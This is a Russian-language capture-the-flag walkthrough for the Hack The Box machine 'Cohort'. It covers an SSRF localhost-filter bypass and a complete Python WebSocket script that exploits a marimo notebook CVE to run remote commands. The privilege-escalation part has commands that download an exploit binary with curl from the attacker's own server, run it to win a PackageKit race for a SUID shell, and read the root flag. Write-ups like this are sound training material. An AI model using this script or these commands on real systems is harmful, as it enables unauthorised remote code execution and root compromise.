Linux - easy
https://app.hackthebox.com/machines/Cohort?tab=play_machine

#### Основная информация:

Сервер: nginx
Открытые порты: 22, 80, 443, 8888
Хост: cohort.htb
Рут: /var/www/cohort

Скрытый хост: nb-1be3782a8afd3ad5.cohort.htb
Порт: 8888
Информация: Внутреннее рабочее пространство аналитика, не для внешнего использования.

#### Разведка:

Вывод nmap:

![[nmap.png]]

Сайт имеет функцию проверки ссылки на валидность.

Предположение: проверить какие файлы доступны самого сервера.

Вывод burp - при попытке обратиться к адресу: 127.0.0.1:

![[burp1.png]]


**Попытки обойти  валидацию**:

Сервер пропускает такой вид локалхоста:

1) в десятичном формате
2) 127.1


**Попытка сбора информации:**

Порт 8888 открыт:

![[HTB.png]]



Попытка получить более подробные данные о сервере: /status

![[burp2.png]]



#### Изучение nb-1be3782a8afd3ad5.cohort.htb:

После перехода на сайт встречает поле ввода пароля/токена.

Данный сайт - marimo (современный реактивный интерактивный блокнот (notebook) с открытым исходным кодом для языка Python)

После проверки, оказалось, что в marimo была критическая уязвимость - [[CVE-2026-39987 (marimo)]]

Используя данный скрипт я получила доступ к системе:

```
import socket, ssl, base64, os, struct, time, select

TARGET_IP = "<machine_ip>"
HOST = "nb-1be3782a8afd3ad5.cohort.htb"
PATH = "/terminal/ws"

def connect():
    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n")
    s.sendall(req.encode())
    s.settimeout(5)
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(4096)
    print("[+] Handshake response:")
    print(resp.decode(errors="replace"))
    return s

def send_text(s, text):
    payload = text.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    length = len(payload)
    if length <= 125:
        header = struct.pack("!BB", 0x81, 0x80 | length)
    elif length <= 65535:
        header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
    s.sendall(header + mask + masked)

def recv_frames(s, duration=3):
    end = time.time() + duration
    buf = b""
    out = b""
    while time.time() < end:
        r, _, _ = select.select([s], [], [], 0.5)
        if r:
            try:
                chunk = s.recv(4096)
            except (socket.timeout, ssl.SSLWantReadError):
                continue
            if not chunk:
                break
            buf += chunk
    while len(buf) >= 2:
        b1 = buf[1]
        masked = b1 & 0x80
        plen = b1 & 0x7F
        idx = 2
        if plen == 126:
            if len(buf) < 4: break
            plen = struct.unpack("!H", buf[2:4])[0]; idx = 4
        elif plen == 127:
            if len(buf) < 10: break
            plen = struct.unpack("!Q", buf[2:10])[0]; idx = 10
        if masked:
            if len(buf) < idx + 4: break
            mask_key = buf[idx:idx+4]; idx += 4
        else:
            mask_key = None
        if len(buf) < idx + plen: break
        payload = buf[idx:idx+plen]
        if mask_key:
            payload = bytes(c ^ mask_key[i % 4] for i, c in enumerate(payload))
        out += payload
        buf = buf[idx+plen:]
    return out

if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
    s = connect()
    print(recv_frames(s, 3).decode(errors="replace"))
    send_text(s, cmd + "\r")
    print(recv_frames(s, 4).decode(errors="replace"))
```


#### Получение флагов:

**Пользовательский флаг:**

![[flag1.png]]


**Root флаг:**

[[CVE-2026-41651 (PackageKit)]]

Скачиваю exploit.bin с данного сайта: https://github.com/shibaaa204/Pack2TheRoot

поднимаю свой сервер:

`python3 -m http.server 8000`

`python3 poc.py "curl -s -o /tmp/exploit.bin http://10.10.16.136:8000/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin"`

провожу гонку:

`python3 poc.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo started"`

`python3 poc.py "cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1"`  :

![[адфп2.png]]


Получение флага: 

`python3 poc.py "/tmp/.suid_bash -p -c 'id; cat /root/root.txt'"`

![[eh.png]]



![[ура.png]]
